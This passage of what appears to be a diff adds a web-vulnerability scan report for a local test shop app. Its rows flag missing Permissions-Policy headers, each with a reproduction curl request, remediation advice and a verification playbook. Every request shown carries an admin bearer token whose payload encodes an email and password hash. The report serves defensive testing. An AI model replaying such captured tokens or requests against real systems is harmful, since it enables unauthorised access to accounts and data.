+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/api/BasketItems/{id}<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  -X DELETE \
+  http://localhost:3000/api/BasketItems/9 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X DELETE \
+  http://localhost:3000/api/BasketItems/9 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/api/Quantitys/<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/api/Quantitys/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Quantitys/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/api/Recycles/<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/api/Recycles/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Recycles/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/admin/application-configuration<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/rest/admin/application-configuration \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/admin/application-configuration \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/basket/{id}<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/rest/basket/1 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/basket/1 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/rest/continue-code<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
